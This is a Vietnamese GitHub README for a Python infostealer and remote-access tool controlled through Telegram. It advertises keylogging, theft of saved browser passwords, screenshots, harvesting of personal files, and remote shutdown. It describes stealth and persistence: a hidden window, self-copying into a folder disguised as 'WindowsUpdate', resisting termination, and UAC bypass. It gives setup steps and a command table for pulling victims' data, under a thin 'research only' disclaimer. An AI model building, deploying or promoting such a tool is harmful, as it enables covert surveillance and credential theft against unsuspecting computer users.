# 🕵️‍♂️ Windows Stealth Bot

![Python](https://img.shields.io/badge/Python-3.x-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Status](https://img.shields.io/badge/Status-Experimental-red.svg)

**Windows-Data-Extractor** là một script Python được thiết kế để chạy ẩn trên hệ điều hành Windows, cung cấp các tính năng như keylogging, trích xuất mật khẩu trình duyệt, chụp ảnh màn hình, và điều khiển từ xa thông qua Telegram. Đây là một công cụ dành cho mục đích nghiên cứu bảo mật và thử nghiệm, không khuyến khích sử dụng cho các hành vi trái phép.

---

## ✨ Tính năng chính

- **🔑 Keylogger**: Ghi lại mọi phím bấm và gửi qua Telegram.
- **🌐 Trích xuất mật khẩu**: Lấy thông tin đăng nhập từ Chrome, Edge, Brave, CocCoc.
- **📸 Chụp màn hình**: Chụp ảnh màn hình và gửi về Telegram.
- **📂 Tìm kiếm file**: Tự động tìm và gửi các file quan trọng (txt, docx, pdf, jpg, png).
- **🛠 Điều khiển từ xa**: Hỗ trợ lệnh tắt máy, khởi động lại, mở URL qua Telegram.
- **🕶 Chạy ẩn**: Ẩn cửa sổ console, tự sao lưu, chống kill từ Task Manager.
- **🔓 Bypass UAC**: Tự động nâng quyền Admin (nếu có thể).

---

## 🚀 Cài đặt

### Yêu cầu
- **Hệ điều hành**: Windows (Tested on Windows 10/11)
- **Python**: 3.x
- **Thư viện cần thiết**:
  ```bash
  pip install telebot pyautogui requests psutil pywin32 pycryptodome keyboard
  ```

### Hướng dẫn cài đặt
1. **Clone repository**:
   ```bash
   git clone https://github.com/username/Windows-Data-Extractor.git
   cd Windows-Data-Extractor
   ```
2. **Cấu hình Telegram**:
   - Tạo bot qua [BotFather](https://t.me/BotFather) để lấy `BOT_TOKEN`.
   - Lấy `CHAT_ID` của bạn hoặc nhóm Telegram.
   - Sửa các biến trong script:
     ```python
     BOT_TOKEN = 'VuDungVapeV4:VuDungVapeV4' 
     CHAT_ID = '-Marceline.Fleur'
     ```
3. **Chạy script**:
   ```bash
   python main.py
   ```

---

## 📖 Cách sử dụng

Sau khi bot khởi động, bạn có thể điều khiển nó qua Telegram bằng các lệnh sau:

| Lệnh                | Chức năng                          |
|---------------------|------------------------------------|
| `/help`             | Hiển thị danh sách lệnh            |
| `/lay_pass`         | Lấy mật khẩu từ trình duyệt        |
| `/lay_keylog`       | Gửi log phím bấm                   |
| `/chup_man_hinh`    | Chụp và gửi ảnh màn hình          |
| `/mo_url <link>`    | Mở URL trong Chrome                |
| `/lay_file`         | Tìm và gửi file quan trọng         |
| `/shutdown`         | Tắt máy                            |
| `/restart`          | Khởi động lại máy                  |

---

## 🛡️ Bảo mật & Tính pháp lý

- **Cảnh báo**: Đây là công cụ nghiên cứu bảo mật. Việc sử dụng trái phép có thể vi phạm pháp luật.
- **Khuyến nghị**: Chỉ chạy trên máy tính bạn sở hữu hoặc được phép thử nghiệm.

---

## 🧠 Phân tích kỹ thuật

Script sử dụng các kỹ thuật sau:
- **Tự backup**: Sao chép chính nó vào `C:\ProgramData\WindowsUpdate` để duy trì hoạt động.
- **Chống end task**: Theo dõi PID và khởi động lại nếu bị tắt.
- **Keylogging**: Sử dụng thư viện `keyboard` để ghi phím.
- **Trích xuất mật khẩu**: Giải mã dữ liệu từ SQLite của trình duyệt bằng `win32crypt` và `AES`.
- **Interacting with Telegram**: Sử dụng `telebot` để gửi dữ liệu và nhận lệnh.

---

## 📌 Ghi chú

- **Hạn chế**: Script chỉ hoạt động trên Windows do phụ thuộc vào `win32crypt` và các API Windows.

---

## 🤝 Đóng góp

1. Fork repository này.
2. Tạo branch mới: `git checkout -b feature/your-feature`.
3. Commit thay đổi: `git commit -m "Them chuc nang cua ban"`.
4. Push lên branch: `git push origin feature/your-feature`.
5. Tạo Pull Request.

---

## 🌟 Liên hệ

Nếu bạn có thắc mắc, hãy liên hệ với mình qua facebook: [Vũ Nguyễn (nguboiz)](www.facebook.com/trumflorentinovucony) hoặc discord: @vudungvapev4

---

*Built with 💻 by [Your Name](https://github.com/vunguyen207) | Last updated: March 27, 2025*

---

## Lưu ý cuối cùng.

Bạn tuyệt đối không được sử dụng script này để thực hiện bất kỳ hành vi nào vi phạm pháp luật hoặc nhằm mục đích trục lợi dưới bất kỳ hình thức nào. vunguyen207 cùng tất cả các cá nhân từng có đóng góp vào repository này sẽ KHÔNG CHỊU BẤT KỲ TRÁCH NHIỆM PHÁP LÝ NÀO đối với mọi hành động, hậu quả hoặc thiệt hại phát sinh từ việc bạn sử dụng script này từ khi script được tạo nên cho mục đích học tập và thử nghiệm.
